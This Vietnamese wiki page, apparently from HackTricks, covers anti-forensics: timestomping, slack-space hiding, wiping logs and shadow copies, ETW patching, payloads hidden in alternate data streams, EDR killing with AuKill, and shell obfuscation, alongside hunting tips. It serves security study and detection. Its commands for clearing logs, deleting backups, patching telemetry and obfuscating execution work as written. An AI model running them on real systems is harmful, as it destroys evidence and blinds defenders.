# Các kỹ thuật chống điều tra số

{{#include ../../banners/hacktricks-training.md}}

## Dấu thời gian

Kẻ tấn công có thể muốn **thay đổi dấu thời gian của các tệp** để tránh bị phát hiện.\
Có thể tìm thấy dấu thời gian trong MFT, ở các thuộc tính `$STANDARD_INFORMATION` \_\_ và \_\_ `$FILE_NAME`.

Cả hai thuộc tính đều có 4 dấu thời gian: **sửa đổi**, **truy cập**, **tạo** và **sửa đổi bản ghi MFT** (MACE hoặc MACB).

**Windows Explorer** và các công cụ khác hiển thị thông tin từ **`$STANDARD_INFORMATION`**.

### TimeStomp - Công cụ chống điều tra số

Công cụ này **sửa đổi** thông tin dấu thời gian bên trong **`$STANDARD_INFORMATION`** **nhưng** **không** sửa đổi thông tin bên trong **`$FILE_NAME`**. Vì vậy, có thể **phát hiện** **hoạt động** **đáng ngờ**.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) là một tính năng của NTFS (hệ thống tệp Windows NT) dùng để theo dõi các thay đổi trên volume. Công cụ [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) cho phép kiểm tra những thay đổi này.

![TimeStomp - Công cụ chống điều tra số - Usnjrnl: USN Journal (Update Sequence Number Journal) là một tính năng của NTFS (hệ thống tệp Windows NT) dùng để theo dõi các thay đổi trên volume. Công cụ...](<../../images/image (801).png>)

Hình ảnh trước đó là **đầu ra** do **công cụ** hiển thị, trong đó có thể thấy một số **thay đổi đã được thực hiện** đối với tệp.

### $LogFile

**Mọi thay đổi siêu dữ liệu trên hệ thống tệp đều được ghi lại** theo một quy trình gọi là [ghi nhật ký trước khi ghi](https://en.wikipedia.org/wiki/Write-ahead_logging). Siêu dữ liệu được ghi lại nằm trong tệp có tên `**$LogFile**`, ở thư mục gốc của hệ thống tệp NTFS. Có thể dùng các công cụ như [LogFileParser](https://github.com/jschicht/LogFileParser) để phân tích tệp này và xác định các thay đổi.

![Usnjrnl - $LogFile: Mọi thay đổi siêu dữ liệu trên hệ thống tệp đều được ghi lại theo một quy trình gọi là ghi nhật ký trước khi ghi. Siêu dữ liệu được ghi lại nằm trong tệp có tên $LogFile , ở thư mục gốc...](<../../images/image (137).png>)

Một lần nữa, trong đầu ra của công cụ có thể thấy **một số thay đổi đã được thực hiện**.

Dùng cùng công cụ này, có thể xác định dấu thời gian đã bị sửa đổi thành thời điểm nào:

![Usnjrnl - $LogFile: Dùng cùng công cụ này, có thể xác định dấu thời gian đã bị sửa đổi thành thời điểm nào](<../../images/image (1089).png>)

- CTIME: Thời gian tạo tệp
- ATIME: Thời gian sửa đổi tệp
- MTIME: Thời gian sửa đổi bản ghi MFT của tệp
- RTIME: Thời gian truy cập tệp

### So sánh `$STANDARD_INFORMATION` và `$FILE_NAME`

Một cách khác để xác định các tệp đã bị sửa đổi đáng ngờ là so sánh thời gian trong cả hai thuộc tính để tìm **điểm không khớp**.

### Nano giây

Dấu thời gian **NTFS** có **độ chính xác** đến **100 nano giây**. Vì vậy, những tệp có dấu thời gian như 2010-10-10 10:10:**00.000:0000 rất đáng ngờ**.

### SetMace - Công cụ chống điều tra số

Công cụ này có thể sửa đổi cả hai thuộc tính `$STARNDAR_INFORMATION` và `$FILE_NAME`. Tuy nhiên, kể từ Windows Vista, cần có một hệ điều hành đang chạy để sửa đổi thông tin này.

## Ẩn dữ liệu

NFTS sử dụng cluster và kích thước thông tin tối thiểu. Điều đó có nghĩa là nếu một tệp chiếm một cluster rưỡi, **nửa còn lại sẽ không được sử dụng** cho đến khi tệp bị xóa. Do đó, có thể **ẩn dữ liệu trong slack space này**.

Có những công cụ như slacker cho phép ẩn dữ liệu trong vùng "ẩn" này. Tuy nhiên, phân tích `$logfile` và `$usnjrnl` có thể cho thấy dữ liệu đã được thêm vào:

![SetMace - Công cụ chống điều tra số - Ẩn dữ liệu: Có những công cụ như slacker cho phép ẩn dữ liệu trong vùng "ẩn" này. Tuy nhiên, phân tích $logfile và $usnjrnl có thể cho thấy...](<../../images/image (1060).png>)

Sau đó, có thể trích xuất slack space bằng các công cụ như FTK Imager. Lưu ý rằng loại công cụ này có thể lưu nội dung ở dạng làm rối hoặc thậm chí được mã hóa.

## UsbKill

Đây là công cụ sẽ **tắt máy tính nếu phát hiện bất kỳ thay đổi nào ở các cổng USB**.\
Có thể phát hiện công cụ này bằng cách kiểm tra các tiến trình đang chạy và **xem xét từng script Python đang chạy**.

## Các bản phân phối Linux chạy trực tiếp

Các bản phân phối này được **chạy trong bộ nhớ RAM**. Chỉ có thể phát hiện chúng nếu hệ thống tệp NTFS được gắn với quyền ghi. Nếu chỉ được gắn với quyền đọc thì sẽ không thể phát hiện sự xâm nhập.

## Xóa an toàn

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Tự xóa Windows có độ trễ

Một ảnh Windows đang chạy có thể bị khóa khi tiến trình của nó còn hoạt động. Một tiến trình có thể giao việc xóa cho tiến trình con `cmd.exe`, dùng `choice` làm bộ hẹn giờ rồi thoát trước khi shell chạy lệnh `del`. Khoảng trễ này giúp tiến trình ban đầu giải phóng handle tới ảnh thực thi; cần đặt đường dẫn đầy đủ trong dấu ngoặc kép nếu đường dẫn có dấu cách.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Khi chuỗi này được cung cấp trực tiếp làm đối số cho `cmd.exe` thay vì được nhập từ một dấu nhắc `cmd` tương tác khác, hãy dùng `&` thay cho `^&` và `>nul` thay cho `^>nul`. Thao tác này xóa mục thư mục; đây **không phải là xóa an toàn** và không loại bỏ dấu vết thực thi, tác vụ, nhật ký hệ thống tệp hoặc các dấu vết pháp chứng khác. Hãy tìm các tiến trình con `cmd.exe` tồn tại trong thời gian ngắn có dòng lệnh kết hợp `choice /T`, `Del` và đường dẫn ảnh tiến trình của tiến trình cha.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Cấu hình Windows

Có thể vô hiệu hóa một số phương thức ghi nhật ký của Windows để khiến quá trình điều tra pháp chứng khó khăn hơn nhiều.

### Vô hiệu hóa dấu thời gian - UserAssist

Đây là khóa registry lưu ngày và giờ mỗi tệp thực thi được người dùng chạy.

Để vô hiệu hóa UserAssist, cần thực hiện hai bước:

1. Đặt hai khóa registry `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` và `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` thành 0 để báo hiệu rằng chúng ta muốn vô hiệu hóa UserAssist.
2. Xóa các nhánh con registry có dạng `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Vô hiệu hóa dấu thời gian - Prefetch

Tính năng này lưu thông tin về các ứng dụng đã chạy nhằm cải thiện hiệu năng hệ thống Windows. Tuy nhiên, thông tin này cũng hữu ích trong hoạt động pháp chứng.

- Chạy `regedit`
- Chọn đường dẫn tệp `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Nhấp chuột phải vào cả `EnablePrefetcher` và `EnableSuperfetch`
- Chọn Modify cho từng mục để đổi giá trị từ 1 (hoặc 3) thành 0
- Khởi động lại

### Vô hiệu hóa dấu thời gian - Last Access Time

Mỗi khi mở một thư mục trên ổ đĩa NTFS của máy chủ Windows NT, hệ thống sẽ **cập nhật trường dấu thời gian trên từng thư mục được liệt kê**, gọi là thời gian truy cập gần nhất. Trên ổ đĩa NTFS được sử dụng nhiều, việc này có thể ảnh hưởng đến hiệu năng.

1. Mở Registry Editor (Regedit.exe).
2. Đi đến `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Tìm `NtfsDisableLastAccessUpdate`. Nếu khóa này chưa tồn tại, hãy thêm DWORD này và đặt giá trị thành 1 để vô hiệu hóa quy trình.
4. Đóng Registry Editor rồi khởi động lại máy chủ.

### Xóa lịch sử USB

Tất cả **mục nhập thiết bị USB** được lưu trong Windows Registry, dưới khóa registry **USBSTOR**, chứa các khóa con được tạo mỗi khi bạn cắm thiết bị USB vào PC hoặc laptop. Bạn có thể tìm khóa này tại H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Xóa khóa này** sẽ xóa lịch sử USB.\
Bạn cũng có thể dùng công cụ [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) để đảm bảo đã xóa chúng (và để xóa chúng).

Một tệp khác lưu thông tin về các thiết bị USB là `setupapi.dev.log` trong `C:\Windows\INF`. Tệp này cũng nên được xóa.

### Vô hiệu hóa Shadow Copies

**Liệt kê** shadow copies bằng `vssadmin list shadowstorage`\
**Xóa** chúng bằng cách chạy `vssadmin delete shadow`

Bạn cũng có thể xóa chúng qua GUI theo các bước được đề xuất tại [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Để vô hiệu hóa shadow copies, hãy làm theo [các bước tại đây](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Mở chương trình Services bằng cách nhập "services" vào ô tìm kiếm văn bản sau khi nhấp nút Start của Windows.
2. Trong danh sách, tìm "Volume Shadow Copy", chọn mục đó rồi mở Properties bằng cách nhấp chuột phải.
3. Chọn Disabled trong danh sách thả xuống "Startup type", sau đó xác nhận thay đổi bằng cách nhấp Apply và OK.

Cũng có thể chỉnh sửa cấu hình xác định những tệp nào sẽ được sao chép trong shadow copy tại registry `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Ghi đè các tệp đã xóa

- Bạn có thể dùng **công cụ Windows**: `cipher /w:C`. Lệnh này yêu cầu cipher xóa mọi dữ liệu khỏi dung lượng đĩa chưa sử dụng hiện có trên ổ C.
- Bạn cũng có thể dùng các công cụ như [**Eraser**](https://eraser.heidi.ie)

### Xóa nhật ký sự kiện Windows

- Windows + R --> eventvwr.msc --> Mở rộng "Windows Logs" --> Nhấp chuột phải vào từng danh mục rồi chọn "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Vô hiệu hóa nhật ký sự kiện Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Trong mục services, vô hiệu hóa dịch vụ "Windows Event Log"
- `WEvtUtil.exec clear-log` hoặc `WEvtUtil.exe cl`

### Vô hiệu hóa $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Can thiệp nhật ký và dấu vết nâng cao (2023-2025)

### Ghi nhật ký PowerShell ScriptBlock/Module

Các phiên bản Windows 10/11 và Windows Server gần đây lưu **nhiều hiện vật pháp chứng PowerShell** trong
`Microsoft-Windows-PowerShell/Operational` (các sự kiện 4104/4105/4106).  
Kẻ tấn công có thể vô hiệu hóa hoặc xóa chúng ngay trong lúc hoạt động:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Defender nên giám sát các thay đổi đối với những registry key đó và việc xóa hàng loạt PowerShell event.

### ETW (Event Tracing for Windows) Patch

Các sản phẩm bảo mật endpoint phụ thuộc nhiều vào ETW. Một phương pháp né tránh phổ biến năm 2024 là patch `ntdll!EtwEventWrite`/`EtwEventWriteFull` trong bộ nhớ để mọi lệnh gọi ETW đều trả về `STATUS_SUCCESS` mà không phát ra event:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Các PoC công khai (ví dụ: `EtwTiSwallow`) triển khai cùng một primitive bằng PowerShell hoặc C++.  
Vì bản vá chỉ áp dụng trong **process**, EDR chạy bên trong các process khác có thể không phát hiện được.<sup>[[5]](#references)</sup>
Phát hiện: so sánh `ntdll` trong bộ nhớ với bản trên đĩa hoặc hook trước user-mode.

### Sự hồi sinh của Alternate Data Streams (ADS)

Các chiến dịch malware trong năm 2023 (ví dụ: loader **FIN12**) được ghi nhận là đã staging các binary giai đoạn hai bên trong ADS để tránh sự chú ý của các trình quét truyền thống:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Liệt kê các stream bằng `dir /R`, `Get-Item -Stream *` hoặc Sysinternals `streams64.exe`.
Sao chép file host sang FAT/exFAT hoặc qua SMB sẽ loại bỏ stream ẩn và có thể giúp
điều tra viên khôi phục payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver hiện được sử dụng thường xuyên để **anti-forensics** trong các
vụ xâm nhập bằng ransomware.  
Công cụ mã nguồn mở **AuKill** tải một driver đã được ký nhưng có lỗ hổng (`procexp152.sys`) để
tạm dừng hoặc chấm dứt EDR và các cảm biến pháp y **trước khi mã hóa và phá hủy log**:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

Trình điều khiển sau đó bị gỡ bỏ, chỉ để lại dấu vết tối thiểu.<sup>[[1]](#references)</sup>  
Biện pháp giảm thiểu: bật danh sách chặn trình điều khiển dễ bị tấn công của Microsoft (HVCI/SAC),
và cảnh báo khi dịch vụ kernel được tạo từ các đường dẫn mà người dùng có thể ghi.

---

## Chống pháp y trên Linux: Tự vá và Cloud C2 (2023–2025)

### Tự vá các dịch vụ bị xâm nhập để giảm khả năng bị phát hiện (Linux)
Các đối thủ ngày càng “tự vá” dịch vụ ngay sau khi khai thác để vừa ngăn bị khai thác lại, vừa hạn chế các cơ chế phát hiện dựa trên lỗ hổng. Ý tưởng là thay thế các thành phần dễ bị tấn công bằng các binary/JAR upstream hợp pháp mới nhất, khiến các công cụ quét báo rằng máy chủ đã được vá trong khi cơ chế duy trì quyền truy cập và C2 vẫn còn.<sup>[[3]](#references)</sup>

Ví dụ: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Sau khi khai thác, kẻ tấn công tải các JAR hợp pháp từ Maven Central (repo1.maven.org), xóa các JAR dễ bị tấn công trong bản cài đặt ActiveMQ rồi khởi động lại broker.
- Việc này khắc phục lỗ hổng RCE ban đầu trong khi vẫn duy trì các điểm xâm nhập khác (cron, thay đổi cấu hình SSH, các implant C2 riêng biệt).

Ví dụ vận hành (minh họa)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Mẹo pháp chứng/săn tìm
- Kiểm tra các thư mục dịch vụ để tìm các binary/JAR bị thay thế ngoài lịch trình:
  - Debian/Ubuntu: `dpkg -V activemq` và so sánh hash/đường dẫn tệp với các mirror repo.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Tìm các phiên bản JAR hiện có trên đĩa nhưng không thuộc quyền quản lý của package manager, hoặc các symbolic link được cập nhật ngoài quy trình.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` để đối chiếu ctime/mtime với khoảng thời gian bị xâm nhập.
- Lịch sử shell/telemetry tiến trình: dấu vết `curl`/`wget` đến `repo1.maven.org` hoặc các CDN artifact khác ngay sau lần khai thác ban đầu.
- Quản lý thay đổi: xác minh ai đã áp dụng “bản vá” và lý do, không chỉ xác nhận phiên bản đã vá hiện diện.

### C2 qua dịch vụ đám mây với bearer token và stager chống phân tích
Tradecraft được quan sát kết hợp nhiều đường dẫn C2 đường dài và cách đóng gói chống phân tích:<sup>[[3]](#references)</sup>
- Trình tải ELF PyInstaller được bảo vệ bằng mật khẩu để cản trở sandboxing và phân tích tĩnh (ví dụ: PYZ được mã hóa, giải nén tạm thời vào `/_MEI*`).
  - Dấu hiệu: kết quả `strings` như `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Dấu vết lúc chạy: giải nén vào `/tmp/_MEI*` hoặc các đường dẫn `--runtime-tmpdir` tùy chỉnh.
- C2 dựa trên Dropbox, sử dụng OAuth Bearer token được hardcode
  - Dấu hiệu mạng: `api.dropboxapi.com` / `content.dropboxapi.com` với `Authorization: Bearer <token>`.
  - Săn tìm trong proxy/NetFlow/Zeek/Suricata các kết nối HTTPS outbound đến domain Dropbox từ workload máy chủ vốn không thường xuyên đồng bộ tệp.
- C2 song song/dự phòng qua tunneling (ví dụ: Cloudflare Tunnel `cloudflared`), duy trì quyền kiểm soát nếu một kênh bị chặn.
  - IOC trên host: tiến trình/unit `cloudflared`, cấu hình tại `~/.cloudflared/*.json`, kết nối outbound cổng 443 đến các edge của Cloudflare.

### Duy trì persistence và “hoàn tác hardening” để giữ quyền truy cập (ví dụ Linux)
Kẻ tấn công thường kết hợp tự vá với các đường truy cập bền vững:<sup>[[3]](#references)</sup>
- Cron/Anacron: chỉnh sửa stub `0anacron` trong từng thư mục `/etc/cron.*/` để thực thi định kỳ.
  - Săn tìm:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Hoàn tác các biện pháp tăng cường bảo mật cấu hình SSH: bật đăng nhập root và thay đổi shell mặc định của các tài khoản có đặc quyền thấp.
  - Tìm dấu hiệu bật đăng nhập root:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Tìm kiếm các shell tương tác đáng ngờ trên tài khoản hệ thống (ví dụ: `games`):
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Các dấu vết beacon ngẫu nhiên, tên ngắn (8 ký tự chữ cái), được ghi xuống đĩa và cũng kết nối tới cloud C2:
  - Truy tìm:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Defender nên đối chiếu các artifact này với những lần phơi lộ ra bên ngoài và các sự kiện vá dịch vụ để phát hiện hoạt động tự khắc phục anti-forensic nhằm che giấu quá trình khai thác ban đầu.

## Thực thi shell nhúng tĩnh

Một script wrapper tích hợp interpreter và các triển khai lệnh có thể chạy các thao tác shell được hỗ trợ bên trong một executable duy nhất, thay vì khởi chạy `/bin/sh` cùng các tiến trình tiện ích riêng biệt. HimitsuShell tạo một binary musl tĩnh như vậy. Không giống [SHc wrappers](../../linux-hardening/processes-crontab-systemd-dbus/cron-and-systemd-timers.md), các lệnh tích hợp của nó không cần khởi chạy shell của host hay một tiến trình tiện ích riêng. Các lệnh không được hỗ trợ có thể chuyển sang dùng system shell.<sup>[[9]](#references)</sup>

Điều này làm giảm khả năng quan sát tiến trình shell và các tiến trình con `execve`.<sup>[[9]](#references)</sup> Tiến trình wrapper và các system call của nó vẫn có thể được quan sát qua các kernel tracepoint, vì vậy không nên hiểu theo nghĩa đen tuyên bố của dự án rằng nó vô hình ngay cả với kernel tracing.<sup>[[9]](#references)[[11]](#references)</sup>

Với bản build x86_64 được tài liệu hóa, hãy giữ tên đầu vào là `launcher.sh` và sao chép nó vào container trước khi biên dịch. Tệp đầu ra là `safeLauncher`:<sup>[[9]](#references)</sup>

```bash
curl -LO https://github.com/HimitsuShell/Himitsu/releases/download/v2.1.0/himitsu_core_x86_64_linux_musl.tar.gz
docker load -i himitsu_core_x86_64_linux_musl.tar.gz
docker run --name himitsu_core -d -it himitsu_core
docker cp launcher.sh himitsu_core:/var/work/
docker exec himitsu_core /var/work/compile.sh
docker cp himitsu_core:/var/work/safeLauncher .
```

`compile.sh` công khai mã hóa script bằng AES-256-CTR, mã hóa giá trị hết hạn cùng các khóa/IV trung gian bằng AES-256-CBC, chuyển các tệp đã mã hóa thành mảng C bằng `xxd -i`, rồi liên kết chúng với `lib.bc` bằng `-static -s`. Khóa và IV mã hóa cuối cùng cũng được nhúng vào, nên đây là biện pháp chống trích xuất tĩnh thông thường, chứ không phải bí mật không thể khôi phục.<sup>[[10]](#references)</sup>

Các LLVM pass mặc định là `-sobf` và `-sub`. Trước khi build, hãy chỉnh sửa `/var/work/compile.sh` để bật các lựa chọn thay thế được tài liệu hóa, chẳng hạn như làm phẳng luồng điều khiển (`fla`) hoặc luồng điều khiển giả (`bcf`).<sup>[[9]](#references)[[10]](#references)</sup>

Hãy kiểm tra tính tương thích của script trước khi phụ thuộc vào wrapper này: dự án hướng đến cú pháp POSIX shell, cảnh báo rằng script Bash/Zsh có thể không chạy được, đồng thời cho biết các lệnh không nằm trong tập lệnh tích hợp sẽ gọi system shell.<sup>[[9]](#references)</sup>

Để phân tích luồng điều khiển đã được làm phẳng, xem [vượt qua luồng điều khiển đã làm phẳng bằng lát thực thi hẹp](../../reversing/reversing-tools-basic-methods/#bypass-flattened-control-flow-with-a-narrow-execution-slice).

{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Sophos X-Ops – AuKill: Driver dễ bị tấn công được vũ khí hóa để vô hiệu hóa EDR (tháng 3 năm 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Vá EtwEventWrite để ẩn mình: Phát hiện và săn tìm (tháng 6 năm 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Vá để duy trì quyền truy cập: Cách malware DripDropper trên Linux di chuyển qua cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – RCE trong Apache ActiveMQ OpenWire (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Ẩn .NET của bạn - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Phát hiện biến thể SectopRAT được nhúng trong phần mềm hợp pháp](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – lệnh choice](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – lệnh del](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
- [9] [HimitsuShell README](https://github.com/HimitsuShell/HimitsuShell)
- [10] [Script build HimitsuShell](https://github.com/HimitsuShell/HimitsuShell/blob/main/inside_container/compile.sh)
- [11] [Histogram sự kiện và theo dõi syscall trong Linux kernel](https://docs.kernel.org/trace/histogram.html)
